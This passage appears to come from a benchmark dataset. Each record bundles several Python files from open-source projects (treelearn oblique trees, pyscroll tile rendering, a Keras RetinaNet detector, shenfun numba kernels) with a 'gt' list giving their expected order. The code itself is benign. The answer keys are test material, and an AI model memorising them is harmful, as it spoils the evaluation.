leaf_model = self.leaf_model,\n                num_features_per_node = self.num_features_per_node,\n                classes = self.classes,\n                depth = self.depth +1,\n                max_depth = self.max_depth,\n                min_leaf_size = self.min_leaf_size,\n                randomize_split_params = self.randomize_split_params,\n                randomize_leaf_params = self.randomize_leaf_params,\n                verbose = self.verbose\n            )\n            child.fit(X_slice, Y_slice, **fit_keywords)\n        return child\n\n\n\n    def fit(self, X, Y, **fit_keywords):\n        n_samples, n_features = X.shape\n\n        if self.verbose:\n            print \"Depth\", self.depth, \": Fitting model for\", n_samples, \"vectors\"\n\n        if self.depth >= self.max_depth or n_samples <= self.min_leaf_size:\n            self.model = self._fit_leaf(X, Y, fit_keywords)\n        else:\n\n\n\n            if self.num_features_per_node:\n                feature_indices = np.random.permutation(n_features)\n                self.subspace  = feature_indices[:self.num_features_per_node]\n                X_reduced = X[:, self.subspace]\n            else:\n                X_reduced = X\n\n\n            self.model = deepcopy(self.split_classifier)\n            for field, gen in self.randomize_split_params.items():\n                setattr(self.model, field, gen())\n            self.model.fit(X_reduced, Y, **fit_keywords)\n            clear_sklearn_fields(self.model)\n            pred = self.model.predict(X_reduced)\n\n            for c in self.classes:\n                mask = (pred == c)\n                count = np.sum(mask)\n                if count == 0:\n                    self.children[c] = ConstantLeaf(int(c))\n                else:\n                    X_slice = X[mask, :]\n                    Y_slice = Y[mask]\n                    self.children[c] = self._fit_child(X_slice, Y_slice, fit_keywords)\n\n    def predict(self, X):\n        nrows = X.shape[0]\n        if self.subspace is not None:\n            X_reduced = X[:, self.subspace]\n            pred = self.model.predict(X_reduced)\n        else:\n            pred = self.model.predict(X)\n\n        if len(self.children) == 0:\n            return pred\n        else:\n\n            outputs = pred.copy()\n            for c in self.classes:\n                mask = (pred == c)\n                X_slice = X[mask, :]\n                count = X_slice.shape[0]\n\n                if count > 0:\n                    pred = self.children[c].predict(X_slice)\n                    outputs[mask] = pred\n            return outputs\n\n'treelearn/treelearn/oblique_tree.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom copy import deepcopy\nimport math\nimport numpy as np\nfrom sklearn.base import BaseEstimator\nfrom sklearn.svm  import LinearSVC\n\nfrom tree_helpers import majority, clear_sklearn_fields\nfrom typecheck import check_estimator, check_dict, check_int, check_bool\nfrom oblique_tree_node import _ObliqueTreeNode\n\n\nclass ObliqueTree(BaseEstimator):\n\n\n    def __init__(self,\n            leaf_model = LinearSVC(),\n            split_classifier = LinearSVC(),\n            num_features_per_node = None,\n            max_depth=3,\n            min_leaf_size=50,\n            randomize_split_params={},\n            randomize_leaf_params={},\n            verbose = False):\n\n\n\n\n        check_estimator(leaf_model)\n        check_estimator(split_classifier)\n        check_int(max_depth)\n        check_int(min_leaf_size)\n        check_dict(randomize_split_params)\n        check_dict(randomize_leaf_params)\n        check_bool(verbose)\n\n        self.leaf_model = leaf_model\n        self.split_classifier = split_classifier\n        self.max_depth = max_depth\n        self.min_leaf_size = min_leaf_size\n        self.num_features_per_node = num_features_per_node\n\n        self.randomize_split_params = randomize_split_params\n        self.randomize_leaf_params = randomize_leaf_params\n        self.verbose = verbose\n\n        self.root = None\n        self.classes = None\n\n    def fit(self, X,Y, **fit_keywords):\n        X = np.atleast_2d(X)\n        Y = np.atleast_1d(Y)\n\n        n_features = X.shape[1]\n        num_features_per_node = self.num_features_per_node\n\n        if num_features_per_node is None:\n            num_features_per_node = int(math.ceil(math.sqrt(X.shape[0])))\n\n        elif num_features_per_node > n_features:\n            num_features_per_node = n_features\n\n        self.classes = list(np.unique(Y))\n\n        self.root = _ObliqueTreeNode(\n            split_classifier = self.split_classifier,\n            leaf_model = self.leaf_model,\n            num_features_per_node = num_features_per_node,\n            classes = self.classes,\n            depth = 1,\n            max_depth = self.max_depth,\n            min_leaf_size = self.min_leaf_size,\n            randomize_split_params = self.randomize_split_params,\n            randomize_leaf_params = self.randomize_leaf_params,\n            verbose = self.verbose\n        )\n        self.root.fit(X, Y, **fit_keywords)\n\n\n    def predict(self, X):\n        return self.root.predict(X)\n\n",
        "gt": [
            "'treelearn/treelearn/oblique_tree_node.py'",
            "'treelearn/treelearn/oblique_tree.py'",
            "'treelearn/treelearn/__init__.py'"
        ]
    },
    {
        "files": [
            "'pyscroll/tests/pyscroll/test_pyscroll.py'",
            "'pyscroll/pyscroll/animation.py'",
            "'pyscroll/pyscroll/data.py'"
        ],
        "content": "'pyscroll/tests/pyscroll/test_pyscroll.py'\n:import unittest\nfrom unittest import mock\n\nimport pygame\n\nfrom pyscroll.data import PyscrollDataAdapter\nfrom pyscroll.orthographic import BufferedRenderer\n\n\nclass DummyDataAdapter(PyscrollDataAdapter):\n    tile_size = (32, 32)\n    map_size = (32, 32)\n    visible_tile_layers = [1]\n\n    def get_animations(self):\n        return list()\n\n    def get_tile_image(self, *position):\n        return position[0] * position[1]\n\n\nclass DummyBufferer:\n    _tile_view = pygame.Rect(2, 2, 2, 2)\n    _clear_color = None\n    _buffer = mock.Mock()\n    _clear_surface = mock.Mock()\n    data = DummyDataAdapter()\n\n\nclass TestTileQueue(unittest.TestCase):\n    def setUp(self) -> None:\n        self.mock = DummyBufferer()\n        self.queue = BufferedRenderer._queue_edge_tiles\n\n    def verify_queue(self, expected: set[tuple[int, int]]) -> None:\n        queue = {i[:2] for i in self.mock._tile_queue}\n        self.assertEqual(queue, set(expected))\n\n    def test_queue_left(self) -> None:\n        self.queue(self.mock, -1, 0)\n        self.verify_queue({(2, 3), (2, 2)})\n\n    def test_queue_top(self) -> None:\n        self.queue(self.mock, 0, -1)\n        self.verify_queue({(2, 2), (3, 2)})\n\n    def test_queue_right(self) -> None:\n        self.queue(self.mock, 1, 0)\n        self.verify_queue({(3, 3), (3, 2)})\n\n    def test_queue_bottom(self) -> None:\n        self.queue(self.mock, 0, 1)\n        self.verify_queue({(2, 3), (3, 3)})\n\n'pyscroll/pyscroll/animation.py'\n:from __future__ import annotations\n\nfrom collections import namedtuple\nfrom collections.abc import Sequence\nfrom typing import Union\n\nAnimationFrame = namedtuple(\"AnimationFrame\", \"image duration\")\nTimeLike = Union[float, int]\n\n__all__ = (\"AnimationFrame\", \"AnimationToken\")\n\n\nclass AnimationToken:\n    __slots__ = [\"next\", \"positions\", \"frames\", \"index\"]\n\n    def __init__(self, positions, frames: Sequence, initial_time: int = 0) -> None:\n\n        frames = tuple(AnimationFrame(*i) for i in frames)\n        self.positions = positions\n        self.frames = frames\n        self.next = frames[0].duration + initial_time\n        self.index = 0\n\n    def advance(self, last_time: TimeLike):\n\n\n        if self.index == len(self.frames) - 1:\n            self.index = 0\n        else:\n            self.index += 1\n\n\n        next_frame = self.frames[self.index]\n        self.next = next_frame.duration + last_time\n        return next_frame\n\n    def __lt__(self, other):\n        try:\n            return self.next < other.next\n        except AttributeError:\n            return self.next < other\n\n'pyscroll/pyscroll/data.py'\n:\nfrom __future__ import annotations\n\nimport time\nfrom heapq import heappop, heappush\nfrom itertools import product\n\nimport pygame\nfrom pygame import Surface\n\ntry:\n\n    import pytmx\nexcept ImportError:\n    pass\n\nfrom .animation import AnimationFrame, AnimationToken\nfrom .common import RectLike, Vector2DInt, rect_to_bb\n\n__all__ = (\n    \"PyscrollDataAdapter\",\n    \"TiledMapData\",\n    \"MapAggregator\",\n)\n\n\nclass PyscrollDataAdapter:\n\n\n\n\n\n\n    tile_size = None\n    map_size = None\n    visible_tile_layers = None\n\n    def __init__(self) -> None:\n        self._last_time = None\n        self._animation_queue = list()\n        self._animated_tile = dict()\n        self._tracked_tiles = set()\n\n    def reload_data(self) -> None:\n        raise NotImplementedError\n\n    def process_animation_queue(\n        self,\n        tile_view: RectLike,\n    ) -> list[tuple[int, int, int, Surface]]:\n\n        new_tiles = list()\n\n\n        self._update_time()\n        try:\n            if self._animation_queue[0].next > self._last_time:\n                return new_tiles\n\n\n        except IndexError:\n            return new_tiles\n\n        new_tiles_append = new_tiles.append\n        tile_layers = tuple(self.visible_tile_layers)\n        get_tile_image = self.get_tile_image\n\n\n        while self._animation_queue[0].next <= self._last_time:\n\n\n            token = heappop(self._animation_queue)\n            next_frame = token.advance(self._last_time)\n            heappush(self._animation_queue, token)\n\n\n\n\n            for position in token.positions.copy():\n                x, y, l = position\n\n\n                if tile_view.collidepoint(x, y):\n\n\n                    self._animated_tile[position] = next_frame.image\n\n\n                    for layer in tile_layers:\n                        if layer == l:\n\n\n                            new_tiles_append((x, y, layer, next_frame.image))\n                        else:\n\n\n                            image = get_tile_image(x, y, layer)\n                            if image:\n                                new_tiles_append((x, y, layer, image))\n\n\n                else:\n                    token.positions.remove(position)\n\n        return new_tiles\n\n    def _update_time(self) -> None:\n\n        self._last_time = time.time() * 1000\n\n    def prepare_tiles(self, tiles: RectLike):\n\n        pass\n\n    def reload_animations(self) -> None:\n\n        self._update_time()\n        self._animation_queue = list()\n        self._tracked_gids = set()\n        self._animation_map = dict()\n\n        for gid, frame_data in self.get_animations():\n            self._tracked_gids.add(gid)\n\n            frames = list()\n            for frame_gid, frame_duration in frame_data:\n                image = self._get_tile_image_by_id(frame_gid)\n                frames.append(AnimationFrame(image, frame_duration))\n\n\n\n\n\n\n\n\n            positions = set()\n            ani = AnimationToken(positions, frames, self._last_time)\n            self._animation_map[gid] = ani\n            heappush(self._animation_queue, ani)\n\n    def get_tile_image(self, x: int, y: int, l: int) -> Surface:\n\n\n\n\n\n\n\n        try:\n\n            return self._animated_tile[(x, y, l)]\n\n        except KeyError:\n\n\n            return self._get_tile_image(x, y, l)\n\n    def _get_tile_image(self, x: int, y: int, l: int) -> Surface:\n\n        raise NotImplementedError\n\n    def _get_tile_image_by_id(self, id):\n\n        raise NotImplementedError\n\n    def get_animations(self) -> None:\n\n        raise NotImplementedError\n\n    def get_tile_images_by_rect(self, rect: RectLike):\n\n        x1, y1, x2, y2 = rect_to_bb(rect)\n        for layer in self.visible_tile_layers:\n            for y, x in product(range(y1, y2 + 1), range(x1, x2 + 1)):\n                tile = self.get_tile_image(x, y, layer)\n                if tile:\n                    yield x, y, layer, tile\n\n\nclass TiledMapData(PyscrollDataAdapter):\n\n\n    def __init__(self, tmx) -> None:\n        super(TiledMapData, self).__init__()\n        self.tmx = tmx\n        self.reload_animations()\n\n    def reload_data(self) -> None:\n        self.tmx = pytmx.load_pygame(self.tmx.filename)\n\n    def get_animations(self):\n        for gid, d in self.tmx.tile_properties.items():\n            try:\n                frames = d[\"frames\"]\n            except KeyError:\n                continue\n\n            if frames:\n                yield gid, frames\n\n    def convert_surfaces(self, parent: Surface, alpha: bool = False) -> None:\n        images = list()\n        for i in self.tmx.images:\n            try:\n                if alpha:\n                    images.append(i.convert_alpha(parent))\n                else:\n                    images.append(i.convert(parent))\n            except AttributeError:\n                images.append(None)\n        self.tmx.images = images\n\n    @property\n    def tile_size(self):\n        return self.tmx.tilewidth, self.tmx.tileheight\n\n    @property\n    def map_size(self):\n        return self.tmx.width, self.tmx.height\n\n    @property\n    def visible_tile_layers(self):\n        return self.tmx.visible_tile_layers\n\n    @property\n    def visible_object_layers(self):\n        return (\n            layer\n            for layer in self.tmx.visible_layers\n            if isinstance(layer, pytmx.TiledObjectGroup)\n        )\n\n    def _get_tile_image(self, x: int, y: int, l: int):\n        try:\n            return self.tmx.get_tile_image(x, y, l)\n        except ValueError:\n            return None\n\n    def _get_tile_image_by_id(self, id) -> Surface:\n        return self.tmx.images[id]\n\n    def get_tile_images_by_rect(self, rect: RectLike):\n        def rev(seq, start, stop):\n            if start < 0:\n                start = 0\n            return enumerate(seq[start : stop + 1], start)\n\n        x1, y1, x2, y2 = rect_to_bb(rect)\n        images = self.tmx.images\n        layers = self.tmx.layers\n        at = self._animated_tile\n        tracked_gids = self._tracked_gids\n        anim_map = self._animation_map\n        track = bool(self._animation_queue)\n\n        for l in self.tmx.visible_tile_layers:\n            for y, row in rev(layers[l].data, y1, y2):\n                for x, gid in [i for i in rev(row, x1, x2) if i[1]]:\n\n\n                    if track and gid in tracked_gids:\n                        anim_map[gid].positions.add((x, y, l))\n                    try:\n\n                        tile = at[(x, y, l)]\n                    except KeyError:\n\n                        tile = images[gid]\n                    if tile:\n                        yield x, y, l, tile\n\n\nclass MapAggregator(PyscrollDataAdapter):\n\n\n    def __init__(self, tile_size) -> None:\n        super().__init__()\n        self.tile_size = tile_size\n        self.map_size = 0, 0\n        self.maps = list()\n        self._min_x = 0\n        self._min_y = 0\n\n    def _get_tile_image(self, x: int, y: int, l: int) -> Surface:\n\n        pass\n\n    def _get_tile_image_by_id(self, id) -> None:\n\n        pass\n\n    def add_map(self, data: PyscrollDataAdapter, offset: Vector2DInt) -> None:\n\n        assert data.tile_size == self.tile_size\n        rect = pygame.Rect(offset, data.map_size)\n        ox = self._min_x - offset[0]\n        oy = self._min_y - offset[1]\n        self._min_x = min(self._min_x, offset[0])\n        self._min_y = min(self._min_y, offset[1])\n        mx = 0\n        my = 0\n\n\n\n        self.maps.append((data, rect))\n        if ox > 0 or oy > 0:\n            for data, rect in self.maps:\n                rect.move_ip((ox, oy))\n                mx = max(mx, rect.right)\n                my = max(my, rect.bottom)\n        else:\n            rect.move_ip(-self._min_x, -self._min_y)\n            mx = max(mx, rect.right)\n            my = max(my, rect.bottom)\n        self.map_size = mx, my\n\n    def remove_map(self, data: PyscrollDataAdapter):\n\n        raise NotImplementedError\n\n    def get_animations(self) -> None:\n\n        pass\n\n    def reload_data(self) -> None:\n\n        pass\n\n    @property\n    def visible_tile_layers(self):\n        layers = set()\n        for data, offset in self.maps:\n            layers.update(list(data.visible_tile_layers))\n        return sorted(layers)\n\n    def get_tile_images_by_rect(self, view: RectLike):\n        view = pygame.Rect(view)\n        for data, rect in self.maps:\n            ox, oy = rect.topleft\n            clipped = rect.clip(view).move(-ox, -oy)\n            for x, y, l, image in data.get_tile_images_by_rect(clipped):\n                yield x + ox, y + oy, l, image\n",
        "gt": [
            "'pyscroll/pyscroll/animation.py'",
            "'pyscroll/pyscroll/data.py'",
            "'pyscroll/tests/pyscroll/test_pyscroll.py'"
        ]
    },
    {
        "files": [
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/detect_all_images.py'",
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/senet.py'",
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/__init__.py'"
        ],
        "content": "'Keras-RetinaNet-for-Teknofest-2019/retinanet/detect_all_images.py'\n:\nfrom keras_retinanet import models\nfrom keras_retinanet.utils.image import read_image_bgr, preprocess_image, resize_image\nfrom keras_retinanet.utils.visualization import draw_box, draw_caption\nfrom keras_retinanet.utils.colors import label_color\nfrom keras_retinanet.utils.gpu import setup_gpu\n\n\nimport cv2\nimport os\nimport numpy as np\nimport time\nimport argparse\nfrom datetime import datetime\nimport json\nfrom tqdm import tqdm\n\nimport tensorflow as tf\nimport logging\ntf.get_logger().setLevel(logging.ERROR)\n\n\nmodel_interface_name = 'teknofest19_huma_resnet50_21_37_inference.h5'\nthresh = 0.22\n\nmodel_path = os.path.join('models', '', model_interface_name)\nmodel = models.load_model(model_path, backbone_name='resnet50')\n\nlabels_to_names = {0: 'arac', 1: 'yaya'}\n\nif not os.path.exists('results/'):\n    os.mkdir('results/')\n\ndt_now = datetime.now().strftime(\"%Y%m%d_%H%M%S\")\nresults_path = os.path.join(\"results/\", \"{0}_{1}\".format(dt_now, model_interface_name))\nos.mkdir(results_path)\n\n\nimages_root_folder = \"../dataset_test/\"\n\n\nmodel = models.load_model(model_path, backbone_name='resnet50')\n\nsdd_images = os.listdir(images_root_folder)\nsdd_images = sorted(sdd_images, key=lambda name: int(name[:-4]))\n\n\n\nresults_json = []\nindex = 0\n\nstart = time.time()\nfor image_filename in tqdm(sdd_images):\n\n    image = read_image_bgr(images_root_folder + image_filename)\n\n    draw = image.copy()\n    draw = cv2.cvtColor(draw, cv2.COLOR_BGR2RGB)\n\n\n    image = preprocess_image(image)\n    image, scale = resize_image(image)\n\n\n    boxes, scores, labels = model.predict_on_batch(np.expand_dims(image, axis=0))\n\n    boxes /= scale\n\n\n    frame_json = {}\n\n    frame_json[\"frame_id\"] = int(image_filename.replace(\".jpg\",\"\").replace(\"../dataset_test/\",\"\"))\n    frame_json[\"nesneler\"] = []\n\n\n\n    for box, score, label in zip(boxes[0], scores[0], labels[0]):\n\n\n        if score < thresh:\n            break\n\n\n        colors = [[255,172,31], [161, 222, 251]]\n        color = colors[label]\n\n        landing_status = -1\n\n        b = box.astype(int)\n\n        if labels_to_names[label] == \"arac\":\n            draw_box(draw, b, color=color)\n\n\n\n            caption = \"{} {:.2f}%\".format(labels_to_names[label], score*100)\n            draw_caption(draw, b, caption, color=color)\n\n\n        if labels_to_names[label] == \"arac\":\n            frame_json[\"nesneler\"].append({\n                \"sinif\": int(label),\n                \"inis_durumu\": landing_status,\n                \"sinirlayici_kutu\": {\n                    \"ust_sol\": {\n                        \"x\":int(box[0]),\n                        \"y\":int(box[1]),\n                    },\n                    \"alt_sag\": {\n                        \"x\":int(box[2]),\n                        \"y\":int(box[3]),\n                    }\n                }\n            })\n\n\n    results_json.append(frame_json)\n\n\n    file_, ext = os.path.splitext(image_filename)\n    image_name = file_.split('/')[-1] + ext\n    output_path = os.path.join(results_path, image_name)\n\n    draw_conv = cv2.cvtColor(draw, cv2.COLOR_BGR2RGB)\n    cv2.imwrite(output_path, draw_conv)\n\n\n\n\n\nwith open('{0}/results_{1}.json'.format(results_path,dt_now), 'w') as fp:\n    json.dump(results_json, fp)\n\n\n\n\n\n'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/senet.py'\n:\"\"\"\nCopyright 2017-2018 Fizyr (https://fizyr.com)\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n Describes backbone information and provides utility functions.\n     Returns a retinanet model using the correct backbone.\n         Downloads ImageNet weights and returns path to weights file.\n         Checks whether the backbone string is correct.\n        \"\"\"\n        allowed_backbones = ['seresnet18', 'seresnet34', 'seresnet50', 'seresnet101', 'seresnet152',\n                             'seresnext50', 'seresnext101', 'senet154']\n        backbone = self.backbone.split('_')[0]\n\n        if backbone not in allowed_backbones:\n            raise ValueError('Backbone (\\'{}\\') not in allowed backbones ({}).'.format(backbone, allowed_backbones))\n\n    def preprocess_image(self, inputs):\n\n        return self.preprocess_image_func(inputs)\n\n\ndef senet_retinanet(num_classes, backbone='seresnext50', inputs=None, modifier=None, **kwargs):\n\n\n    if inputs is None:\n        if keras.backend.image_data_format() == 'channels_first':\n            inputs = keras.layers.Input(shape=(3, None, None))\n        else:\n\n            inputs = keras.layers.Input(shape=(None, None, 3))\n\n    classifier, _ = Classifiers.get(backbone)\n    model = classifier(input_tensor=inputs, include_top=False, weights=None)\n\n\n    if backbone == 'seresnet18' or backbone == 'seresnet34':\n        layer_outputs = ['stage3_unit1_relu1', 'stage4_unit1_relu1', 'relu1']\n    elif backbone == 'seresnet50':\n        layer_outputs = ['activation_36', 'activation_66', 'activation_81']\n    elif backbone == 'seresnet101':\n        layer_outputs = ['activation_36', 'activation_151', 'activation_166']\n    elif backbone == 'seresnet152':\n        layer_outputs = ['activation_56', 'activation_236', 'activation_251']\n    elif backbone == 'seresnext50':\n        layer_outputs = ['activation_37', 'activation_67', 'activation_81']\n    elif backbone == 'seresnext101':\n        layer_outputs = ['activation_37', 'activation_152', 'activation_166']\n    elif backbone == 'senet154':\n        layer_outputs = ['activation_59', 'activation_239', 'activation_253']\n    else:\n        raise ValueError('Backbone (\\'{}\\') is invalid.'.format(backbone))\n\n    layer_outputs = [\n        model.get_layer(name=layer_outputs[0]).output,\n        model.get_layer(name=layer_outputs[1]).output,\n        model.get_layer(name=layer_outputs[2]).output,\n    ]\n\n    model = keras.models.Model(inputs=inputs, outputs=layer_outputs, name=model.name)\n\n\n    if modifier:\n        model = modifier(model)\n\n\n    backbone_layers = {\n        'C3': model.outputs[0],\n        'C4': model.outputs[1],\n        'C5': model.outputs[2]\n    }\n\n\n    return retinanet.retinanet(inputs=inputs, num_classes=num_classes, backbone_layers=backbone_layers, **kwargs)\n\n\ndef seresnet18_retinanet(num_classes, inputs=None, **kwargs):\n    return senet_retinanet(num_classes=num_classes, backbone='seresnet18', inputs=inputs, **kwargs)\n\n\ndef seresnet34_retinanet(num_classes, inputs=None, **kwargs):\n    return senet_retinanet(num_classes=num_classes, backbone='seresnet34', inputs=inputs, **kwargs)\n\n\ndef seresnet50_retinanet(num_classes, inputs=None, **kwargs):\n    return senet_retinanet(num_classes=num_classes, backbone='seresnet50', inputs=inputs, **kwargs)\n\n\ndef seresnet101_retinanet(num_classes, inputs=None, **kwargs):\n    return senet_retinanet(num_classes=num_classes, backbone='seresnet101', inputs=inputs, **kwargs)\n\n\ndef seresnet152_retinanet(num_classes, inputs=None, **kwargs):\n    return senet_retinanet(num_classes=num_classes, backbone='seresnet152', inputs=inputs, **kwargs)\n\n\ndef seresnext50_retinanet(num_classes, inputs=None, **kwargs):\n    return senet_retinanet(num_classes=num_classes, backbone='seresnext50', inputs=inputs, **kwargs)\n\n\ndef seresnext101_retinanet(num_classes, inputs=None, **kwargs):\n    return senet_retinanet(num_classes=num_classes, backbone='seresnext101', inputs=inputs, **kwargs)\n\n\ndef senet154_retinanet(num_classes, inputs=None, **kwargs):\n    return senet_retinanet(num_classes=num_classes, backbone='senet154', inputs=inputs, **kwargs)\n\n'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/__init__.py'\n:from __future__ import print_function\nimport sys\n\n\nclass Backbone(object):\n\n    def __init__(self, backbone):\n\n        from .. import layers\n        from .. import losses\n        from .. import initializers\n        self.custom_objects = {\n            'UpsampleLike'     : layers.UpsampleLike,\n            'PriorProbability' : initializers.PriorProbability,\n            'RegressBoxes'     : layers.RegressBoxes,\n            'FilterDetections' : layers.FilterDetections,\n            'Anchors'          : layers.Anchors,\n            'ClipBoxes'        : layers.ClipBoxes,\n            '_smooth_l1'       : losses.smooth_l1(),\n            '_focal'           : losses.focal(),\n        }\n\n        self.backbone = backbone\n        self.validate()\n\n    def retinanet(self, *args, **kwargs):\n\n        raise NotImplementedError('retinanet method not implemented.')\n\n    def download_imagenet(self):\n\n        raise NotImplementedError('download_imagenet method not implemented.')\n\n    def validate(self):\n\n        raise NotImplementedError('validate method not implemented.')\n\n    def preprocess_image(self, inputs):\n\n        raise NotImplementedError('preprocess_image method not implemented.')\n\n\ndef backbone(backbone_name):\n\n    if 'densenet' in backbone_name:\n        from .densenet import DenseNetBackbone as b\n    elif 'seresnext' in backbone_name or 'seresnet' in backbone_name or 'senet' in backbone_name:\n        from .senet import SeBackbone as b\n    elif 'resnet' in backbone_name:\n        from .resnet import ResNetBackbone as b\n    elif 'mobilenet' in backbone_name:\n        from .mobilenet import MobileNetBackbone as b\n    elif 'vgg' in backbone_name:\n        from .vgg import VGGBackbone as b\n    elif 'EfficientNet' in backbone_name:\n        from .effnet import EfficientNetBackbone as b\n    else:\n        raise NotImplementedError('Backbone class for  \\'{}\\' not implemented.'.format(backbone))\n\n    return b(backbone_name)\n\n\ndef load_model(filepath, backbone_name='resnet50'):\n\n    from tensorflow import keras\n    return keras.models.load_model(filepath, custom_objects=backbone(backbone_name).custom_objects)\n\n\ndef convert_model(model, nms=True, class_specific_filter=True, anchor_params=None, **kwargs):\n\n    from .retinanet import retinanet_bbox\n    return retinanet_bbox(model=model, nms=nms, class_specific_filter=class_specific_filter, anchor_params=anchor_params, **kwargs)\n\n\ndef assert_training_model(model):\n\n    assert(all(output in model.output_names for output in ['regression', 'classification'])), \\\n        \"Input is not a training model (no 'regression' and 'classification' outputs were found, outputs are: {}).\".format(model.output_names)\n\n\ndef check_training_model(model):\n\n    try:\n        assert_training_model(model)\n    except AssertionError as e:\n        print(e, file=sys.stderr)\n        sys.exit(1)\n",
        "gt": [
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/senet.py'",
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/__init__.py'",
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/detect_all_images.py'"
        ]
    },
    {
        "files": [
            "'shenfun/shenfun/optimization/numba/__init__.py'",
            "'shenfun/shenfun/optimization/numba/diagma.py'",
            "'shenfun/shenfun/optimization/numba/threedma.py'"
        ],
        "content": "'shenfun/shenfun/optimization/numba/__init__.py'\n:import numpy as np\nimport numba as nb\nfrom .diagma import *\nfrom .threedma import *\nfrom .twodma import *\nfrom .tdma import *\nfrom .pdma import *\nfrom .fdma import *\nfrom .heptadma import *\nfrom .la import *\nfrom .helmholtz import *\nfrom .biharmonic import *\nfrom .chebyshev import *\nfrom .transforms import *\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef crossND(c, a, b):\n    c[0] = a[1]*b[2] - a[2]*b[1]\n    c[1] = a[2]*b[0] - a[0]*b[2]\n    c[2] = a[0]*b[1] - a[1]*b[0]\n    return c\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef cross2D(c, a, b):\n    for i in range(a.shape[1]):\n        for j in range(a.shape[2]):\n                a0 = a[0, i, j]\n                a1 = a[1, i, j]\n                b0 = b[0, i, j]\n                b1 = b[1, i, j]\n                c[i, j] = a0*b1 - a1*b0\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef cross3D(c, a, b):\n    for i in range(a.shape[1]):\n        for j in range(a.shape[2]):\n            for k in range(a.shape[3]):\n                a0 = a[0, i, j, k]\n                a1 = a[1, i, j, k]\n                a2 = a[2, i, j, k]\n                b0 = b[0, i, j, k]\n                b1 = b[1, i, j, k]\n                b2 = b[2, i, j, k]\n                c[0, i, j, k] = a1*b2 - a2*b1\n                c[1, i, j, k] = a2*b0 - a0*b2\n                c[2, i, j, k] = a0*b1 - a1*b0\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef outer2D(a, b, c, symmetric):\n    N, M = a.shape[1:]\n    if symmetric:\n        for i in range(N):\n            for j in range(M):\n                c[0, i, j] = a[0, i, j]**2\n                c[1, i, j] = a[0, i, j]*a[1, i, j]\n                c[2, i, j] = c[1, i, j]\n                c[3, i, j] = a[1, i, j]**2\n    else:\n        for i in range(N):\n            for j in range(M):\n                c[0, i, j] = a[0, i, j]*b[0, i, j]\n                c[1, i, j] = a[0, i, j]*b[1, i, j]\n                c[2, i, j] = a[1, i, j]*b[0, i, j]\n                c[3, i, j] = a[1, i, j]*b[1, i, j]\n\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef outer3D(a, b, c, symmetric):\n    N, M, P = a.shape[1:]\n    if symmetric:\n        for i in range(N):\n            for j in range(M):\n                for k in range(P):\n                    c[0, i, j, k] = a[0, i, j, k]**2\n                    c[1, i, j, k] = a[0, i, j, k]*a[1, i, j, k]\n                    c[2, i, j, k] = a[0, i, j, k]*a[2, i, j, k]\n                    c[3, i, j, k] = c[1, i, j, k]\n                    c[4, i, j, k] = a[1, i, j, k]**2\n                    c[5, i, j, k] = a[1, i, j, k]*a[2, i, j, k]\n                    c[6, i, j, k] = c[2, i, j, k]\n                    c[7, i, j, k] = c[5, i, j, k]\n                    c[8, i, j, k] = a[2, i, j, k]**2\n    else:\n        for i in range(N):\n            for j in range(M):\n                for k in range(P):\n                    c[0, i, j, k] = a[0, i, j, k]*b[0, i, j, k]\n                    c[1, i, j, k] = a[0, i, j, k]*b[1, i, j, k]\n                    c[2, i, j, k] = a[0, i, j, k]*b[2, i, j, k]\n                    c[3, i, j, k] = a[1, i, j, k]*b[0, i, j, k]\n                    c[4, i, j, k] = a[1, i, j, k]*b[1, i, j, k]\n                    c[5, i, j, k] = a[1, i, j, k]*b[2, i, j, k]\n                    c[6, i, j, k] = a[2, i, j, k]*b[0, i, j, k]\n                    c[7, i, j, k] = a[2, i, j, k]*b[1, i, j, k]\n                    c[8, i, j, k] = a[2, i, j, k]*b[2, i, j, k]\n\n\ndef apply_mask(u_hat, mask):\n    if mask is not None:\n        if u_hat.ndim == mask.ndim:\n            mask = np.broadcast_to(mask, u_hat.shape)\n            if mask.ndim == 1:\n                u_hat = apply_mask_1D(u_hat, mask)\n            elif mask.ndim == 2:\n                u_hat = apply_mask_2D(u_hat, mask)\n            elif mask.ndim == 3:\n                u_hat = apply_mask_3D(u_hat, mask)\n            elif mask.ndim == 4:\n                u_hat = apply_mask_4D(u_hat, mask)\n            else:\n                u_hat *= mask\n        elif u_hat.ndim == mask.ndim + 1:\n            mask = np.broadcast_to(mask, u_hat.shape[1:])\n            if mask.ndim == 1:\n                u_hat = apply_bmask_1D(u_hat, mask)\n            elif mask.ndim == 2:\n                u_hat = apply_bmask_2D(u_hat, mask)\n            elif mask.ndim == 3:\n                u_hat = apply_bmask_3D(u_hat, mask)\n            elif mask.ndim == 4:\n                u_hat = apply_bmask_4D(u_hat, mask)\n            else:\n                u_hat *= mask\n        else:\n            u_hat = apply_bxmask(u_hat, mask)\n    return u_hat\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef apply_mask_1D(u, mask):\n    for i in range(u.shape[0]):\n        if mask[i] == 0:\n            u[i] = 0\n    return u\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef apply_mask_2D(u, mask):\n    for i in range(u.shape[0]):\n        for j in range(u.shape[1]):\n            if mask[i, j] == 0:\n                u[i, j] = 0\n    return u\n\n@nb.jit(nopython=True, fastmath=True, cache=True)\ndef apply_mask_3D(u, mask):\n    for i in 